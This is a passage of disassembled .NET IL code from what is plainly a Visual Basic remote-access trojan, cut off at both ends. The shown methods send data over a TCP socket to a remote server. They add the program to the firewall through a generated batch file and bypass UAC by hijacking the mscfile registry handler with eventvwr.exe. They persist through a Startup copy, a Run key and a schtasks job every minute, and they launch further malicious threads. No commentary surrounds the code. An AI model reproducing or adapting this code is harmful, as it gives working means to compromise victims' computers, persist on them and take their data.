        IL_006a:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_006f:  ldloc.s    'stream'
        IL_0071:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0076:  ldc.i4.0
        IL_0077:  ldloc.s    'stream'
        IL_0079:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
        IL_007e:  conv.ovf.i4
        IL_007f:  ldc.i4.0
        IL_0080:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Send(uint8[],
                                                                                    int32,
                                                                                    int32,
                                                                                    valuetype [System]System.Net.Sockets.SocketFlags)
        IL_0085:  pop
        IL_0086:  leave.s    IL_00c9

      }  // end .try
      finally
      {
        IL_0088:  ldloc.s    VB$t_ref$L0
        IL_008a:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
        IL_008f:  endfinally
      }  // end handler
      IL_0090:  leave.s    IL_00c9

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0092:  dup
      IL_0093:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0098:  stloc.s    ex
      .try
      {
        IL_009a:  ldsfld     bool F.P::Cn
        IL_009f:  brfalse.s  IL_00b1

        IL_00a1:  ldc.i4.0
        IL_00a2:  stsfld     bool F.P::Cn
        IL_00a7:  ldsfld     class [System]System.Net.Sockets.TcpClient F.P::C
        IL_00ac:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
        IL_00b1:  leave.s    IL_00c2

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_00b3:  dup
        IL_00b4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00b9:  stloc.s    V_6
        IL_00bb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00c0:  leave.s    IL_00c2

      }  // end handler
      IL_00c2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00c7:  leave.s    IL_00c9

    }  // end handler
    IL_00c9:  ldsfld     bool F.P::Cn
    IL_00ce:  ret

    IL_00cf:  ldloc.0
    IL_00d0:  ret
  } // end of method P::Sendb

  .method public static void  INSS() cil managed
  {
    // Code size       191 (0xbf)
    .maxstack  4
    .locals init ([0] string[] VB$t_array$S0)
    .try
    {
      IL_0000:  ldstr      "SEE_MASK_NOZONECHECKS"
      IL_0005:  ldstr      "1"
      IL_000a:  ldc.i4.1
      IL_000b:  call       void [mscorlib]System.Environment::SetEnvironmentVariable(string,
                                                                                     string,
                                                                                     valuetype [mscorlib]System.EnvironmentVariableTarget)
      IL_0010:  leave.s    IL_001e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0012:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0017:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_001c:  leave.s    IL_001e

    }  // end handler
    IL_001e:  ldsfld     string F.P::Sti
    IL_0023:  ldstr      "\\"
    IL_0028:  ldsfld     string F.P::RG
    IL_002d:  ldstr      ".bat"
    IL_0032:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string,
                                                                string)
    IL_0037:  ldc.i4.s   9
    IL_0039:  newarr     [mscorlib]System.String
    IL_003e:  stloc.0
    IL_003f:  ldloc.0
    IL_0040:  ldc.i4.0
    IL_0041:  ldstr      "Sleep 5\r\nnetsh firewall add allowedprogram \""
    IL_0046:  stelem.ref
    IL_0047:  ldloc.0
    IL_0048:  ldc.i4.1
    IL_0049:  ldsfld     class [mscorlib]System.IO.FileInfo F.P::LO
    IL_004e:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
    IL_0053:  stelem.ref
    IL_0054:  ldloc.0
    IL_0055:  ldc.i4.2
    IL_0056:  ldstr      "\" \""
    IL_005b:  stelem.ref
    IL_005c:  ldloc.0
    IL_005d:  ldc.i4.3
    IL_005e:  ldsfld     class [mscorlib]System.IO.FileInfo F.P::LO
    IL_0063:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0068:  stelem.ref
    IL_0069:  ldloc.0
    IL_006a:  ldc.i4.4
    IL_006b:  ldstr      "\" ENABLE\r\ndel "
    IL_0070:  stelem.ref
    IL_0071:  ldloc.0
    IL_0072:  ldc.i4.5
    IL_0073:  ldsfld     string F.P::Sti
    IL_0078:  stelem.ref
    IL_0079:  ldloc.0
    IL_007a:  ldc.i4.6
    IL_007b:  ldstr      "\\"
    IL_0080:  stelem.ref
    IL_0081:  ldloc.0
    IL_0082:  ldc.i4.7
    IL_0083:  ldsfld     string F.P::RG
    IL_0088:  stelem.ref
    IL_0089:  ldloc.0
    IL_008a:  ldc.i4.8
    IL_008b:  ldstr      ".bat"
    IL_0090:  stelem.ref
    IL_0091:  ldloc.0
    IL_0092:  call       string [mscorlib]System.String::Concat(string[])
    IL_0097:  call       void [mscorlib]System.IO.File::WriteAllText(string,
                                                                     string)
    IL_009c:  ldsfld     string F.P::Sti
    IL_00a1:  ldstr      "\\"
    IL_00a6:  ldsfld     string F.P::RG
    IL_00ab:  ldstr      ".bat"
    IL_00b0:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string,
                                                                string)
    IL_00b5:  ldc.i4.0
    IL_00b6:  ldc.i4.0
    IL_00b7:  ldc.i4.m1
    IL_00b8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                               valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                               bool,
                                                                                               int32)
    IL_00bd:  pop
    IL_00be:  ret
  } // end of method P::INSS

  .method public static uint8[]  Z(uint8[] B) cil managed
  {
    // Code size       109 (0x6d)
    .maxstack  4
    .locals init ([0] uint8[] 'array',
             [1] uint8[] buffer2,
             [2] int32 count,
             [3] class [System]System.IO.Compression.GZipStream 'stream',
             [4] class [mscorlib]System.IO.MemoryStream stream2,
             [5] uint8[] Z)
    IL_0000:  ldarg.0
    IL_0001:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor(uint8[])
    IL_0006:  stloc.s    stream2
    IL_0008:  ldloc.s    stream2
    IL_000a:  ldc.i4.0
    IL_000b:  newobj     instance void [System]System.IO.Compression.GZipStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                       valuetype [System]System.IO.Compression.CompressionMode)
    IL_0010:  stloc.3
    IL_0011:  ldc.i4.4
    IL_0012:  newarr     [mscorlib]System.Byte
    IL_0017:  stloc.1
    IL_0018:  ldloc.s    stream2
    IL_001a:  ldloc.s    stream2
    IL_001c:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
    IL_0021:  ldc.i4.5
    IL_0022:  conv.i8
    IL_0023:  sub.ovf
    IL_0024:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_0029:  ldloc.s    stream2
    IL_002b:  ldloc.1
    IL_002c:  ldc.i4.0
    IL_002d:  ldc.i4.4
    IL_002e:  callvirt   instance int32 [mscorlib]System.IO.MemoryStream::Read(uint8[],
                                                                               int32,
                                                                               int32)
    IL_0033:  pop
    IL_0034:  ldloc.1
    IL_0035:  ldc.i4.0
    IL_0036:  call       int32 [mscorlib]System.BitConverter::ToInt32(uint8[],
                                                                      int32)
    IL_003b:  stloc.2
    IL_003c:  ldloc.s    stream2
    IL_003e:  ldc.i4.0
    IL_003f:  conv.i8
    IL_0040:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_0045:  ldloc.2
    IL_0046:  ldc.i4.1
    IL_0047:  sub.ovf
    IL_0048:  ldc.i4.1
    IL_0049:  add.ovf
    IL_004a:  ldc.i4.1
    IL_004b:  sub.ovf
    IL_004c:  ldc.i4.1
    IL_004d:  add.ovf
    IL_004e:  newarr     [mscorlib]System.Byte
    IL_0053:  stloc.0
    IL_0054:  ldloc.3
    IL_0055:  ldloc.0
    IL_0056:  ldc.i4.0
    IL_0057:  ldloc.2
    IL_0058:  callvirt   instance int32 [System]System.IO.Compression.GZipStream::Read(uint8[],
                                                                                       int32,
                                                                                       int32)
    IL_005d:  pop
    IL_005e:  ldloc.3
    IL_005f:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0064:  ldloc.s    stream2
    IL_0066:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_006b:  ldloc.0
    IL_006c:  ret
  } // end of method P::Z

  .method private specialname static void 
          _Lambda$__1() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       24 (0x18)
    .maxstack  8
    IL_0000:  ldsfld     class [System]System.Net.Sockets.TcpClient F.P::C
    IL_0005:  ldc.i4     0x493e0
    IL_000a:  conv.i8
    IL_000b:  ldc.i4     0x3e8
    IL_0010:  conv.i8
    IL_0011:  call       bool F.P::StKp(class [System]System.Net.Sockets.TcpClient,
                                        uint64,
                                        uint64)
    IL_0016:  pop
    IL_0017:  ret
  } // end of method P::_Lambda$__1

  .method private specialname static void 
          _Lambda$__2() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       24 (0x18)
    .maxstack  8
    IL_0000:  ldsfld     class [System]System.Net.Sockets.TcpClient F.P::C
    IL_0005:  ldc.i4     0x493e0
    IL_000a:  conv.i8
    IL_000b:  ldc.i4     0x3e8
    IL_0010:  conv.i8
    IL_0011:  call       bool F.P::StKp(class [System]System.Net.Sockets.TcpClient,
                                        uint64,
                                        uint64)
    IL_0016:  pop
    IL_0017:  ret
  } // end of method P::_Lambda$__2

} // end of class F.P

.class public auto ansi F.D
       extends [mscorlib]System.Object
{
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method D::.ctor

  .method public static void  Main() cil managed noinlining nooptimization
  {
    .entrypoint
    .custom instance void [mscorlib]System.STAThreadAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       785 (0x311)
    .maxstack  5
    .locals init ([0] class [mscorlib]System.Exception V_0,
             [1] class [mscorlib]System.Exception V_1,
             [2] string hrt,
             [3] string shel,
             [4] class [mscorlib]System.Exception ex,
             [5] class [mscorlib]System.Exception V_5,
             [6] class [mscorlib]System.Threading.Thread A,
             [7] class [mscorlib]System.Threading.Thread A1,
             [8] class [mscorlib]System.Threading.Thread A2,
             [9] class [mscorlib]System.Exception V_9,
             [10] class [mscorlib]System.Exception V_10,
             [11] class [mscorlib]System.Exception V_11)
    .try
    {
      IL_0000:  call       void F.P::Active()
      IL_0005:  ldsfld     string F.P::Sl
      IL_000a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_000f:  call       object F.P::Thr(int32)
      IL_0014:  pop
      .try
      {
        IL_0015:  ldsfld     string F.P::Sti
        IL_001a:  ldstr      "\\"
        IL_001f:  ldsfld     string F.P::Ex
        IL_0024:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0029:  call       void [mscorlib]System.IO.File::Delete(string)
        IL_002e:  ldsfld     string F.P::Stu
        IL_0033:  call       void [mscorlib]System.IO.File::Delete(string)
        IL_0038:  leave.s    IL_0048

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_003a:  dup
        IL_003b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0040:  stloc.0
        IL_0041:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0046:  leave.s    IL_0048

      }  // end handler
      IL_0048:  ldsfld     string F.P::Sti
      IL_004d:  call       bool [mscorlib]System.IO.Directory::Exists(string)
      IL_0052:  brfalse.s  IL_006e

      .try
      {
        IL_0054:  ldsfld     string F.P::Sti
        IL_0059:  call       void [mscorlib]System.IO.Directory::Delete(string)
        IL_005e:  leave.s    IL_006e

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0060:  dup
        IL_0061:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0066:  stloc.1
        IL_0067:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_006c:  leave.s    IL_006e

      }  // end handler
      .try
      {
        IL_006e:  ldsfld     string F.P::Sti
        IL_0073:  call       bool [mscorlib]System.IO.Directory::Exists(string)
        IL_0078:  brtrue     IL_0150

        IL_007d:  ldsfld     string F.P::Sti
        IL_0082:  call       class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.Directory::CreateDirectory(string)
        IL_0087:  pop
        IL_0088:  ldsfld     bool F.P::Fo
        IL_008d:  brfalse.s  IL_00b9

        IL_008f:  ldsfld     string F.P::DR
        IL_0094:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
        IL_0099:  ldstr      "\\"
        IL_009e:  ldsfld     string F.P::Fol
        IL_00a3:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_00a8:  call       object F.P::Hx(string)
        IL_00ad:  pop
        IL_00ae:  ldsfld     string F.P::Sti
        IL_00b3:  call       object F.P::Hx(string)
        IL_00b8:  pop
        IL_00b9:  ldsfld     class [mscorlib]System.IO.FileInfo F.P::LO
        IL_00be:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_00c3:  ldsfld     string F.P::Sti
        IL_00c8:  ldstr      "\\"
        IL_00cd:  ldsfld     string F.P::Ex
        IL_00d2:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_00d7:  ldc.i4.1
        IL_00d8:  call       void [mscorlib]System.IO.File::Copy(string,
                                                                 string,
                                                                 bool)
        IL_00dd:  ldstr      "%SystemRoot%\\system32\\mmc.exe"
        IL_00e2:  stloc.3
        IL_00e3:  ldloc.3
        IL_00e4:  ldstr      " \"%1\" %*"
        IL_00e9:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_00ee:  stloc.2
        IL_00ef:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::CurrentUser
        IL_00f4:  ldstr      "Software\\Classes\\mscfile\\shell\\open\\command"
        IL_00f9:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
        IL_00fe:  ldstr      ""
        IL_0103:  ldsfld     string F.P::Sti
        IL_0108:  ldstr      "\\"
        IL_010d:  ldsfld     string F.P::Ex
        IL_0112:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0117:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_011c:  ldstr      "eventvwr.exe"
        IL_0121:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
        IL_0126:  pop
        IL_0127:  ldc.i4     0x2710
        IL_012c:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
        IL_0131:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::CurrentUser
        IL_0136:  ldstr      "Software\\Classes\\mscfile\\shell\\open\\command"
        IL_013b:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
        IL_0140:  ldstr      ""
        IL_0145:  ldloc.2
        IL_0146:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_014b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
        IL_0150:  leave.s    IL_0166

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0152:  dup
        IL_0153:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0158:  stloc.s    ex
        IL_015a:  call       void F.P::K()
        IL_015f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0164:  leave.s    IL_0166

      }  // end handler
      IL_0166:  ldsfld     bool F.P::HE
      IL_016b:  brfalse.s  IL_018e

      .try
      {
        IL_016d:  ldsfld     class [mscorlib]System.IO.FileInfo F.P::LO
        IL_0172:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0177:  call       object F.P::Hx(string)
        IL_017c:  pop
        IL_017d:  leave.s    IL_018e

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_017f:  dup
        IL_0180:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0185:  stloc.s    V_5
        IL_0187:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_018c:  leave.s    IL_018e

      }  // end handler
      IL_018e:  ldsfld     bool F.P::Se
      IL_0193:  brfalse.s  IL_01b0

      IL_0195:  ldnull
      IL_0196:  ldftn      void F.Km::U()
      IL_019c:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_01a1:  ldc.i4.1
      IL_01a2:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                  int32)
      IL_01a7:  stloc.s    A
      IL_01a9:  ldloc.s    A
      IL_01ab:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_01b0:  ldsfld     bool F.P::Sh
      IL_01b5:  brfalse.s  IL_01d2

      IL_01b7:  ldnull
      IL_01b8:  ldftn      void F.Km::I()
      IL_01be:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_01c3:  ldc.i4.1
      IL_01c4:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                  int32)
      IL_01c9:  stloc.s    A1
      IL_01cb:  ldloc.s    A1
      IL_01cd:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_01d2:  ldsfld     bool F.P::Bt
      IL_01d7:  brfalse.s  IL_01f4

      IL_01d9:  ldnull
      IL_01da:  ldftn      void F.Km::C()
      IL_01e0:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_01e5:  ldc.i4.1
      IL_01e6:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                  int32)
      IL_01eb:  stloc.s    A2
      IL_01ed:  ldloc.s    A2
      IL_01ef:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_01f4:  ldsfld     bool F.P::IsF
      IL_01f9:  brfalse.s  IL_025b

      .try
      {
        IL_01fb:  ldsfld     class [mscorlib]System.IO.FileInfo F.P::LO
        IL_0200:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0205:  ldc.i4.7
        IL_0206:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
        IL_020b:  ldstr      "\\"
        IL_0210:  ldsfld     string F.P::RG
        IL_0215:  ldstr      ".exe"
        IL_021a:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_021f:  ldc.i4.1
        IL_0220:  call       void [mscorlib]System.IO.File::Copy(string,
                                                                 string,
                                                                 bool)
        IL_0225:  ldc.i4.7
        IL_0226:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
        IL_022b:  ldstr      "\\"
        IL_0230:  ldsfld     string F.P::RG
        IL_0235:  ldstr      ".exe"
        IL_023a:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_023f:  ldc.i4.3
        IL_0240:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                                 valuetype [mscorlib]System.IO.FileMode)
        IL_0245:  stsfld     class [mscorlib]System.IO.FileStream F.P::FS
        IL_024a:  leave.s    IL_025b

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_024c:  dup
        IL_024d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0252:  stloc.s    V_9
        IL_0254:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0259:  leave.s    IL_025b

      }  // end handler
      IL_025b:  ldsfld     bool F.P::Isu
      IL_0260:  brfalse.s  IL_02b0

      .try
      {
        IL_0262:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer F.P::F
        IL_0267:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_026c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_0271:  ldsfld     string F.P::Sf
        IL_0276:  ldc.i4.1
        IL_0277:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_027c:  ldsfld     string F.P::RG
        IL_0281:  ldstr      "\""
        IL_0286:  ldsfld     class [mscorlib]System.IO.FileInfo F.P::LO
        IL_028b:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0290:  ldstr      "\" .."
        IL_0295:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_029a:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_029f:  leave.s    IL_02b0

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_02a1:  dup
        IL_02a2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02a7:  stloc.s    V_10
        IL_02a9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02ae:  leave.s    IL_02b0

      }  // end handler
      IL_02b0:  ldsfld     bool F.P::Fa
      IL_02b5:  brfalse.s  IL_02eb

      IL_02b7:  ldc.i4.7
      IL_02b8:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02bd:  ldstr      "\\"
      IL_02c2:  ldsfld     string F.P::RG
      IL_02c7:  ldstr      ".lnk"
      IL_02cc:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_02d1:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_02d6:  brtrue.s   IL_02e4

      IL_02d8:  call       void F.Km::Thr()
      IL_02dd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_02e2:  leave.s    IL_0310

      IL_02e4:  call       void F.P::K()
      IL_02e9:  leave.s    IL_0310

      IL_02eb:  call       void F.P::K()
      IL_02f0:  leave.s    IL_0310

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02f2:  dup
      IL_02f3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02f8:  stloc.s    V_11
      IL_02fa:  ldloc.s    V_11
      IL_02fc:  callvirt   instance string [mscorlib]System.Exception::ToString()
      IL_0301:  ldc.i4.0
      IL_0302:  ldnull
      IL_0303:  call       valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.MsgBoxResult [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::MsgBox(object,
                                                                                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.MsgBoxStyle,
                                                                                                                                                                object)
      IL_0308:  pop
      IL_0309:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_030e:  leave.s    IL_0310

    }  // end handler
    IL_0310:  ret
  } // end of method D::Main

} // end of class F.D

.class public auto ansi sealed F.Km
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .method public static void  Thr() cil managed
  {
    // Code size       49 (0x31)
    .maxstack  4
    .locals init ([0] class [mscorlib]System.Exception V_0)
    .try
    {
      IL_0000:  ldsfld     class [mscorlib]System.IO.FileInfo F.P::LO
      IL_0005:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_000a:  ldc.i4.7
      IL_000b:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0010:  ldsfld     string F.P::RG
      IL_0015:  ldstr      ""
      IL_001a:  call       object F.Km::M(string,
                                          string,
                                          string,
                                          string)
      IL_001f:  pop
      IL_0020:  leave.s    IL_0030

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0022:  dup
      IL_0023:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0028:  stloc.0
      IL_0029:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_002e:  leave.s    IL_0030

    }  // end handler
    IL_0030:  ret
  } // end of method Km::Thr

  .method public static void  S() cil managed
  {
    // Code size       74 (0x4a)
    .maxstack  4
    .locals init ([0] int32 t,
             [1] class [mscorlib]System.Exception V_1)
    IL_0000:  ldc.i4.0
    IL_0001:  stloc.0
    IL_0002:  ldc.i4     0x3e8
    IL_0007:  call       object F.P::Thr(int32)
    IL_000c:  pop
    .try
    {
      IL_000d:  ldloc.0
      IL_000e:  ldc.i4.1
      IL_000f:  add.ovf
      IL_0010:  stloc.0
      IL_0011:  ldloc.0
      IL_0012:  ldc.i4.s   16
      IL_0014:  ble.s      IL_0038

      IL_0016:  ldc.i4.0
      IL_0017:  stloc.0
      IL_0018:  ldsfld     class [mscorlib]System.IO.FileInfo F.P::LO
      IL_001d:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0022:  ldc.i4.7
      IL_0023:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0028:  ldsfld     string F.P::RG
      IL_002d:  ldstr      ""
      IL_0032:  call       object F.Km::M(string,
                                          string,
                                          string,
                                          string)
      IL_0037:  pop
      IL_0038:  leave.s    IL_0048

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003a:  dup
      IL_003b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0040:  stloc.1
      IL_0041:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0046:  leave.s    IL_0048

    }  // end handler
    IL_0048:  br.s       IL_0002
  } // end of method Km::S

  .method public static void  F() cil managed
  {
    // Code size       175 (0xaf)
    .maxstack  4
    .locals init ([0] int32 t,
             [1] string Pathing,
             [2] class [System]System.Diagnostics.Process prog3,
             [3] class [mscorlib]System.Exception V_3,
             [4] class [mscorlib]System.Exception V_4,
             [5] int32 VB$t_i4$L0,
             [6] class [System]System.Diagnostics.Process[] VB$t_array$L0)
    IL_0000:  ldc.i4.0
    IL_0001:  stloc.0
    IL_0002:  ldc.i4     0x3e8
    IL_0007:  call       object F.P::Thr(int32)
    IL_000c:  pop
    .try
    {
      IL_000d:  ldloc.0
      IL_000e:  ldc.i4.1
      IL_000f:  add.ovf
      IL_0010:  stloc.0
      IL_0011:  ldloc.0
      IL_0012:  ldc.i4.s   16
      IL_0014:  ble        IL_0099

      IL_0019:  ldc.i4.0
      IL_001a:  stloc.0
      .try
      {
        IL_001b:  ldstr      "schtasks /create /sc minute /mo 1 /tn "
        IL_0020:  ldsfld     string F.P::SeN
        IL_0025:  ldstr      " /tr "
        IL_002a:  ldsfld     class [mscorlib]System.IO.FileInfo F.P::LO
        IL_002f:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0034:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0039:  stloc.1
        IL_003a:  ldloc.1
        IL_003b:  ldc.i4.0
        IL_003c:  ldc.i4.0
        IL_003d:  ldc.i4.m1
        IL_003e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                   valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                   bool,
                                                                                                   int32)
        IL_0043:  pop
        IL_0044:  ldc.i4     0x3e8
